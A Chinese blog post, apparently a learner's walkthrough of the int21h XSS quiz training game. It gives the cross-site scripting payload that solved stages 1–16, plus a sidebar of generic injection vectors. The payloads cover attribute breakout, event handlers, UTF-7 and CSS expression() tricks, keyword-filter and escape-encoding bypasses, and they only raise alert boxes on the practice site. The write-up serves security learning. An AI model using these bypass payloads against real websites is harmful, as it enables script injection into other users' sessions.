---
title: XSS过关小游戏~
date: 2016-09-08 14:00:33
tags:
- XSS
- JavaScript
---

这个挺有意思的，日本人写的，入门XSS，感觉学到了不少！

# 第一关：
>http://xss-quiz.int21h.jp/?sid=7b714949025dc80a78855d84fc428ef4b4601ab5

```javascript
<img onerror="alert(document.domain);" src= />
```

or

```javascript
<script>alert(document.domain);</script>
```

<!--more-->

# 第二关
>http://xss-quiz.int21h.jp/stage2.php?sid=8e7ed5afb72d0df250f54279ef8a868d8e0aafa7

先用

```javascript
<script>alert(document.domain);</script>
```

检查源码，发现，组成

```javascript
<INPUT size=50 value="<script>alert(document.domain);</script>" name=p1>
```

没有过滤，可以组合js，闭合`value=""`，进行注入！

```javascript
"><script>alert(document.domain);</script><
```

# 第三关
>http://xss-quiz.int21h.jp/stage-3.php?sid=387be4b596182a93c5eea6e6dfd85d69b23c9f82

输入：

```javascript
<script>alert(document.domain);</script>
```
源码显示：

```javascript
&#60;script&#62;alert(document.domain);&#60;/script&#62;
```

输入框发现使用特殊字符：`<>""/ \`都被过滤了。
打开源码，**不是审查元素**：

```html
<form action="?sid=83ba7c40f05160cdd42fec2bd6fd2f6d6ce5464f" method="post">
Search a place: <input type="text" name="p1" size="30">
<input type="submit" value="Search"> &nbsp;
Choose a country: <select name="p2">
<option>Japan</option>
<option>Germany</option>
<option>USA</option>
<option>United Kingdom</option>
</select><hr class="red">We couldn't find any places called <b>"&lt;&gt;"</b> in <b>Japan</b>.<hr class="red"></form>
```

可以看到特殊字符，被转译为`&lt;&gt;`等html字符。<br>
卡住，看到：解析说输入框不止这一个，随后发现，form表单中还有另一个需要提交的数据，select框的数据，可以通过console修改select中的数据，进而修改提交的数据。而select是没有被过滤的！

修改dom：

```javascript
document.forms[0].p2.childNodes[1].innerHtml = '<script>alert(document.domain);</script>'
```

发现innerHTML不能插入js，我需要js字符串，而不是代码，那么可以用innerText属性。

```javascript
document.forms[0].p2.childNodes[1].innerText = '<script>alert(document.domain);</script>'
```

这样，select的第一个选项已经被修改，接下来随便输入并提交，ok。

# 第四关
>http://xss-quiz.int21h.jp/stage_4.php?sid=95a179f3d0230ffe9a4d12c5b049ea1aa9d27242

此时，select和input均作了过滤，都不能进行注入，但是查看发现，有隐藏输入框，可以尝试注入。

```javascript
document.forms[0].p3.value = '"><script>alert(document.domain);</script>'
```
# 第五关

>http://xss-quiz.int21h.jp/stage--5.php?sid=d83cbbb5c8b5fc0b9bc4677c3a51287aa17b7adc

长度限制，发现限制了文本输入长度，但只在表面上做了限制。
	
```javascript
document.forms[0].p1.maxlength = 100
```

修改输入框输入内容长度限制。然后注入：

```javascript
document.forms[0].p1.value = '"><script>alert(document.domain)</script><"'
```

# 第六关

>http://xss-quiz.int21h.jp/stage-no6.php?sid=53cb838f6fe2a388b3e2adf56290494fe9edf999

我还是太弱鸡了，竟然看了答案，这题还是比较好分析的。<br>
输入特殊字符发现：`" `未被过滤，可以截断value输入，但是字符 `<>` 被转译。<br/>
仍存在注入。<br>
通过添加事件注入！<br>
	
```javascript
" onfocus="alert(document.domain);
```
or

```javascript
" onfocus="alert(document.domain);"
```

==================Don't look boring==========================

Ps:<br>
>当使用XSS时，分为三种类型:<br>
>**A**:直接注入，可以截断属性，注入事件。

```javascript
Script tags: <script src=" ;>
Event handler attributes: <body onload="alert('xss')">
CSS: <p style="background:url('javascript:alert(1)')">
URLs:<img src="javascript:alert('XSS')">
```

>**B**.Proprietary extensions to HTML private development
私人开发专有扩展HTML，**主要是针对只支持IE浏览器的私有标签！**

```javascript
XML data islands(IE) :
<xml src=" ; id="x">
<span datasrc="#x" datafld="c" dataformatas="html">
```

XML data islands(IE)(数据岛)(<a href="http://www.w3school.com.cn/xml/xml_dont.asp">使用</a>)：
>1.是嵌入 HTML 页面中的 XML 数据。<br>
>2.XML 数据岛只在 Internet Explorer 浏览器中有效。<br>

```javascript
JavaScript expressions in attribute(NS4):
<p id="&{alert('XSS')}">
```


​	
```javascript
Conditional comments(IE)
<!--[if gte IE 4]>
<script>alert('XSS')</script>
<![endif]-->
```
Conditional comments(条件注释)：定义了一些通过IE执行的HTML标记

# 第七关
>http://xss-quiz.int21h.jp/stage07.php?sid=459abb17ecd98b0930668f93ee5beba7f81cf0e2

```javascript
" onfocus=alert(document.domain);
```

上面第六关还是能注入，不知道后台验证怎么处理的？

# 第八关
>http://xss-quiz.int21h.jp/stage008.php?sid=69802cd8ff91f9b4fd0a84d9c67ff957cdd04cf5

当浏览器载入一个Javascript URL时，它会执行URL中所包含的Javascript代码。

>javascript:alert(document.domain);

# 第九关

>http://xss-quiz.int21h.jp/stage_09.php?sid=8b17627ebee78fbe1bd2b569f8e2fd96c0934aa9

查看源码，发现提交数据时，带有一行数据编码：

```javascript
<INPUT size=50 name=p1>
<INPUT type=hidden value=euc-jp name=charset>
```

可以利用了IE对于UTF-7的漏洞，过滤对于UTF-7的不支持，以及IE对于UTF-7的漏洞！

## UTF-7
>用以将Unicode字符以ASCII编码的字符串来呈现。

```javascript
<INPUT name="charset" type="hidden" value="utf-7" >
```

将

```javascript
" onfocus="alert(document.domain);
```
utf-7编码为：

```javascript
+ACI onfocus+AD0AIg-alert(document.domain)+ADs-
```

这个编码网站挺全的：

**http://toolswebtop.com/text/process/encode**(<a href="http://toolswebtop.com/text/process/encode">点击</a>)

## 第十关

>http://xss-quiz.int21h.jp/stage00010.php?sid=03afa49981651d6e65498615e3ea60525a79d6e3

发现过滤了domain关键字，关键词过滤，一定是用了正则表达式，那么怎么过正则表达式？

>例如他过滤了“domain”关键字，那么只要domain出现，就会被替换，那么可以在domain关键字中间再加一个，组成“dodomainmain”，这样中间的domain被过滤，剩下的部分组成domain，这样就越过了！（好机智！）

```javascript
" onfocus="alert(document.dodomainmain)"
```

# 第十一关：
>http://xss-quiz.int21h.jp/stage11th.php?sid=8e2ec6beef278b3786780ab3b7fe5729b6746f83

输入：

```javascript
" onfocus="alert(document.dodomainmain)"
```

查看页面源码：

```javascript
<INPUT size=50 name=p1 ? onxxx="alert(document.dodomainmain)">
```

查看提示：
>Hint: "s/script/xscript/ig;" and "s/on[a-z]+=/onxxx=/ig;" and "s/style=/stxxx=/ig;" 

>说明过滤了`on.*`等一大部分， `s.*`和`script.`会变成`<xscript>` 
## 制表符越过
输入：

```javascript
"><a href="javascript:alert(document.domain);">XSS</a>
```
源码发现：

```javascript
<A href="javaxscript:alert(document.domain);">XSS</A>
```
加入制表符：

```javascript
"><a href="javascri	p	t:alert(document.domain)";>XSS</a> //OK
```

过了！

疑惑：
为什么

```javascript
" on&#x09;focus="alert(document.dodomainmain)"
```
过不去？

显示：

```javascript
<INPUT size=50 name=p1 ? on&#x09;focus="alert(document.dodomainmain)">
```

但是，如果输入

```javascript
" on&#x09;focus="al&#x09;ert(document.dodomainmain)"
```

显示：

```javascript
<INPUT size=50 name=p1 ? on&#x09;focus="al&#9;ert(document.dodomainmain)">
```

这个HTML的转义应该是针对字符串的;

总结：以后尽量把结果引`<a href=""></a>`。


# 第十二关
>http://xss-quiz.int21h.jp/stage_no012.php?sid=5fce85f3ef5a811fe114d396d935edaf0ebde988

发现，`<>``""`单独使用并未过滤，但是`<script>`、`alert`是被过滤了

再看Hint：
	
```javascript
 "s/[\x00-\x20\<\>\"\']//g;" 
```

`x00~x20`都被过滤，制表符无法使用了！，同样，`<> "  '`都被滤了！

## 利用IE \`\`的漏洞

IE对于反单引号没有很好的过滤，使用  \`\`  可以很轻松的截断输入，但是在google下测试，发现 \`\` 被过滤了。
>
> <font color='red'>**\`**</font>:反单引号，上排数字键1的前面，其上档符号是“~ ”

可以截断输入，那就好办了！

```javascript
`` onfocus="alert(document.domain);"  //IE下可行
```

# 第十三关

>http://xss-quiz.int21h.jp/stage13_0.php?sid=609f8f638582fa34f0405165397b3498ff14ccc6

如何在CSS样式中利用expression实现JavaScript中的onmouseover/onmouseout事件。<br>
很奇怪，在ie11上，答案也不能成功，但是换了虚拟机里的IE8，成功。<br>
**说明这个expression是一个浏览器兼容性的问题**，解决这类兼容性xss漏洞，使用ie6即以下，效果可能更好！<br>
附答案：

```javascript
aa:expression(onfocus = function(){alert(document.domain)})
```

>在CSS样式中注入这段代码就能弹了。。<br>
>但是现实环境中怎么可能有如此简单就能插入的地方。。<br>
>很难找到的说。。<br>
>话说，现实中怎么利用呢？<br>
>有2种注入：<br>

(1)@import 和 expression<br>

```javascript
@import "http://web/xss.css"  
@import 'javascript:alert("xss")'  
body{xss:expression(alert('xss'))]  
<img style="xss:expression(alert('xss'))">  
```

(2)css代码中js，vs脚本

```javascript
body{backgroud-image:url(javascript:alert('xss'))}  
body{backgroud-image:url(vbscript:msgbox('xss'))} 
```

# 第十四关

>http://xss-quiz.int21h.jp/stage-_-14.php?sid=a31bf0d89239baebc366349049721215014871f8

>发现expression关键字被正则了！绕过**(IE8即以下！)**：<br>

1.编码绕过

```javascript
aa:\0065xpression(onfocus = function(){alert(document.domain)}) ERROR
```

2.`\` 绕过

```javascript
aa:e\xpression(onfocus = function(){alert(document.domain)}) ERROR
```

3.`\0` 绕过

```javascript
aa:e\0xpression(onfocus = function(){alert(document.domain)}) ok
```

4.`\**\`绕过
	

```javascript
aa:e\**\xpression(onfocus = function(){alert(document.domain)}) ERROR
```

5.`/**/`绕过
>好像是注解绕过

```javascript
aa:e/**/xpression(onfocus = function(){alert(document.domain)}) ok
```

  

**<font color="orange">`\uxxxx`这种格式是Unicode写法，表示一个字符，其中xxxx表示一个16进制数字，范围所0～65535. Unicode十六进制数只能包含数字0～9、大写字母A～F或者小写字母A～F。需要注意到是：Unicode的大小端问题，一般都是小端在前，例如 `\u5c0f` 表示汉语中的 '小'字，转换成10进制就是9215，所以在byte数组中应该是1592.</font>**

# 第十五关
>http://xss-quiz.int21h.jp/stage__15.php?sid=06dc6feab3cd2eb57a3f8a0de6be1bc57a2ccda1

输入：

```javascript
<script>alert(document.domain)</script>
```

源码查看，不是审查元素

```javascript
<script>document.write("&lt;script&gt;alert(document.domain)&lt;/script&gt;");</script>
```

可以看到 `< > `这两个字符被替换为`"&lt;`和`&gt`;，说明有过滤！

由于此页使用`document.write(value)`，来写出内容，所以肯定存在注入！

控制台

```javascript
alert("\u003c") //显示符号 <
\u0061lert("123") //123
```

JS支持这种写法，此处注入：

```javascript
\\74script\\76alert(document.domain);\\74/script\\76
```

能成功的原因在于使用：

```javascript
document.write();
```

执行了js，将字符串编译了！



## JS编码（\转义字符+八进制 || 十六进制 || unicode）<<a href="http://www.cnblogs.com/ecalf/archive/2012/09/04/unicode.html">参见</a>>

>**所有的ASCII码都可以用`\`加数字（一般是8进制数字）来表示。`\x`表示后面的字符是十六进制数，`\`表示后面的字符是八进制数。**<br> 

八进制（`\`+八进制）

```javascript
\74script\76alert(document.domain);\74/script\76
```

十六进制
	
```javascript
\x3cscript\x3ealert(document.domain);\x3c/script\x3e
```

发现过滤了单个 `\`

Octonary：

```javascript
\\74script\\76alert(document.domain);\\74/script\\76
```

Hexadecimal

```javascript
\\x3cscript\\x3ealert(document.domain);\\x3c/script\\x3e
```

**Unicode**好像也可以！

>`\u` 加 4个16进制字符表示一个字符的编码

```javascript
\\u003cscript\\u003ealert(document.domain);\\u003c/script\\u003e
```

# 十六关

>http://xss-quiz.int21h.jp/stage00000016.php?sid=0f20ae30108832c1a7f8aa65d59214523f03a73d

过滤了十六进制，我们还有八进制和unicode

```javascript
\\u003cscript\\u003ealert(document.domain);\\u003c/script\\u003e

\\74script\\76alert(document.domain);\\74/script\\76
```


## 第十七十八（UNSOLVED）

>需要配合IE6即以下浏览器解决！
